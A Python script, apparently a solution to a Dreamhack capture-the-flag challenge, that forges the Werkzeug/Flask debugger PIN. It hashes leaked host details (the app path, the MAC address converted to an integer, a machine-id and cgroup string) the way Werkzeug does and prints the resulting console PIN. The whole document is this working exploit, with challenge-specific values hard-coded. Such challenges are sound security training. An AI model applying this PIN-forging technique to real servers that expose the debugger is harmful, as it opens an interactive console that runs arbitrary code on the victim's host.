import hashlib
from itertools import chain

probably_public_bits = [
    "dreamhack",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    "187999308491777",  # MAC 주소 16진수 -> int
    b"c31eea55a29431535ff01de94bdcf5cflibpod-89adcf650a0a154baaafa9b35e4555914066838e61c7375de6a10500e35b7672",
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)